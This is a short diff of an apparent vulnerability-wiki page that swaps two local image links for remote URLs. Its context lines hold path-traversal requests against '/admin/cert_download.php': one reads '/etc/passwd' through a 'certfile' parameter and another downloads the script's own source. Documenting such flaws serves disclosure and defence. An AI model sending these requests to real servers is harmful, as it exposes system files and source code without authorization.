@@ -38,10 +38,10 @@ exit();
 /admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd
 ```
 
-![](image/qax-1.png)
+![](http://wikioss.peiqi.tech/vuln/qax-1.png)
 
 ```
 /admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php
 ```
 
-![](image/qax-2.png)
+![](http://wikioss.peiqi.tech/vuln/qax-2.png)
